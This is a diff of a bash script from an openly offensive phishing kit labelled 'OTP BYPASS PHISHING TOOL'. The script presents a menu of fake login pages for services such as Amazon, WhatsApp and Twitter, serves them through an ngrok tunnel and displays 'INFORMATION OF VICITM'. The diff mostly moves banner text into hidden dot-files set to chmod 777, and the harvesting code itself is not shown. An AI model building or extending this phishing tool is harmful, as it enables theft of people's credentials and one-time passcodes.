@@ -28,30 +28,40 @@ ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
 kill -9 $php
 kill -9 $ngrok
 clear
+
+echo ""
+
+echo "
+#!/bin/bash
+#clolors
 white='\e[1;37m'
 green='\e[0;32m'
 blue='\e[1;34m'
 red='\e[1;31m'
 yellow='\e[1;33m' 
-echo ""
-bannerr="
-printf '\e[1;33m\e[0m\e[1;37m     ███████ ██████  ██    ██    \e[0m''\e[1;33m\e[0m\e[1;32m ██████  ██   ██ ██ ███████   \e[0m'
-printf '\e[1;33m\e[0m\e[1;37m     ██   ██ ██   █  ██    ██    \e[0m''\e[1;33m\e[0m\e[1;32m ██   █  ██   ██ ██ ██        \e[0m'
-printf '\e[1;33m\e[0m\e[1;37m     ███████ ██   ██ ██    ██ ███\e[0m''\e[1;33m\e[0m\e[1;32m ██████  ███████ ██ ███████   \e[0m'
-printf '\e[1;33m\e[0m\e[1;37m     ██   ██ ██   ██  ██  ██     \e[0m''\e[1;33m\e[0m\e[1;32m ██      ██   ██ ██      ██   \e[0m'
-printf '\e[1;33m\e[0m\e[1;37m     ██   ██ ██████    ████      \e[0m''\e[1;33m\e[0m\e[1;32m ██      ██   ██ ██ ███████   \e[0m'
-  echo""    
-printf '\e[1;33m\e[0m\e[1;33m    ██████████\e[0m'"\e[96m██████████"'\e[1;33m\e[0m\e[1;31m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m OTP BYPASS PHISHING TOOL \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.1] \e[0m'                                       
-echo ""
-printf '\e[1;33m\e[0m\e[1;33m  [ \e[0m\e[1;32m Follow on Github :- https://github.com/Ignitetch/AdvPhishing \e[0m \e[1;32m\e[0m\e[1;33m] \e[0m'
-echo ""
-printf '\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ >>\e[0m'
-echo -e "\e[93m    |A|D|V|A|N|C|E| |P|H|I|S|H|I|N|G| |2|.|1|"
-printf '\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ >>\e[0m' 
-echo ""                                          
-"
+echo ''
+echo''
+banner() {
+ echo -e $'\e[1;33m\e[0m\e[1;37m     ███████ ██████  ██    ██    \e[0m''\e[1;33m\e[0m\e[1;32m ██████  ██   ██ ██ ███████   \e[0m'
+ echo -e $'\e[1;33m\e[0m\e[1;37m     ██   ██ ██   █  ██    ██    \e[0m''\e[1;33m\e[0m\e[1;32m ██   █  ██   ██ ██ ██        \e[0m'
+ echo -e $'\e[1;33m\e[0m\e[1;37m     ███████ ██   ██ ██    ██ ███\e[0m''\e[1;33m\e[0m\e[1;32m ██████  ███████ ██ ███████   \e[0m'
+ echo -e $'\e[1;33m\e[0m\e[1;37m     ██   ██ ██   ██  ██  ██     \e[0m''\e[1;33m\e[0m\e[1;32m ██      ██   ██ ██      ██   \e[0m'
+ echo -e $'\e[1;33m\e[0m\e[1;37m     ██   ██ ██████    ████      \e[0m''\e[1;33m\e[0m\e[1;32m ██      ██   ██ ██ ███████   \e[0m'
+ echo''    
+ echo -e $'\e[1;33m\e[0m\e[1;33m    ██████████\e[0m''\e[96m██████████''\e[1;33m\e[0m\e[1;31m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m OTP BYPASS PHISHING TOOL \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.1] \e[0m'                                       
+ echo ''
+ echo -e $'\e[1;33m\e[0m\e[1;33m  [ \e[0m\e[1;32m Follow on Github :- https://github.com/Ignitetch/AdvPhishing \e[0m \e[1;32m\e[0m\e[1;33m] \e[0m'
+ echo ''
+ echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ >>\e[0m'
+ echo -e '\e[93m    |A|D|V|A|N|C|E| |P|H|I|S|H|I|N|G| |2|.|1|'      
+ echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ >>\e[0m' 
+ echo ''                                                
+  }
+banner
 
-banner ="
+
+ " > .bannerr
+echo "
 
  Dude Just Select Any Option
 ---------------------------- > > >
@@ -68,21 +78,23 @@ banner ="
 [10] Amazon-TFO            [21] Twitter-TFO       [32] Pinterest
 [11] WhatsApp-TFO          [22] Flipcart-TFO      [99] Exit
 
-"
+" > .banner
+echo "   
+ _______ _______ _______ __   _ _     _ _______ _______ _     _
+ |______ |______ |       | \  | |_____| |_____| |       |____/ 
+ ______| |______ |_____  |  \_| |     | |     | |_____  |    \_
+                                                               
 
-secnhack = "
- ____  _____ ____ _   _ _   _    _    ____ _  __  ___ _   _ 
-/ ___|| ____/ ___| \ | | | | |  / \  / ___| |/ / |_ _| \ | |
-\___ \|  _|| |   |  \| | |_| | / _ \| |   | ' /   | ||  \| |
- ___) | |__| |___| |\  |  _  |/ ___ \ |___| . \ _ | || |\  |
-|____/|_____\____|_| \_|_| |_/_/   \_\____|_|\_(_)___|_| \_|
+====================== www.secnhack.in ==========================    
+=============== Learn Hacking From This Website ================= 
+" > .secnhack
 
-======================== www.secnhack.in ==========================    
-====================== Learn Hacking From This Website =============
-"
 
-bannerr
-cat banner | lolcat
+chmod 777 .banner
+chmod 777 .bannerr
+chmod 777 .secnhack
+bash .bannerr
+cat .banner | lolcat
 echo ""
 echo ""
  
@@ -110,7 +122,7 @@ echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                            echo ""
                            echo ""
-                           cat secnhack
+                           cat .secnhack
                            echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                            echo ""
                            echo "" 
@@ -157,7 +169,7 @@ echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                            echo ""
                            echo ""
-                           cat secnhack
+                           cat .secnhack
                            echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                            echo ""
                            echo "" 
@@ -204,7 +216,7 @@ echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                            echo ""
                            echo ""
-                           cat secnhack
+                           cat .secnhack
                            echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                            echo ""
                            echo "" 
@@ -251,7 +263,7 @@ echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                            echo ""
                            echo ""
-                           cat secnhack
+                           cat .secnhack
                            echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                            echo ""
                            echo "" 
@@ -299,7 +311,7 @@ echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                            echo ""
                            echo ""
-                           cat secnhack
+                           cat .secnhack
                            echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                            echo ""
                            echo "" 
@@ -346,7 +358,7 @@ echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                            echo ""
                            echo ""
-                           cat secnhack
+                           cat .secnhack
                            echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                            echo ""
                            echo "" 
@@ -404,7 +416,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -447,7 +459,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -496,7 +508,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -544,7 +556,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -591,7 +603,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -637,7 +649,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -684,7 +696,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -730,7 +742,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -777,7 +789,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -823,7 +835,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -869,7 +881,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -916,7 +928,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -964,7 +976,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1011,7 +1023,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1057,7 +1069,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1103,7 +1115,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1149,7 +1161,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1196,7 +1208,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1243,7 +1255,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1290,7 +1302,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1338,7 +1350,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1386,7 +1398,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1433,7 +1445,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1479,7 +1491,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1526,7 +1538,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1574,7 +1586,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
@@ -1620,7 +1632,7 @@ echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
-                          cat secnhack
+                          cat .secnhack
                           echo -e "\e[96m======================\e[91m INFORMATION OF VICITM \e[96m========================= \e[93m"
                           echo ""
                           echo "" 
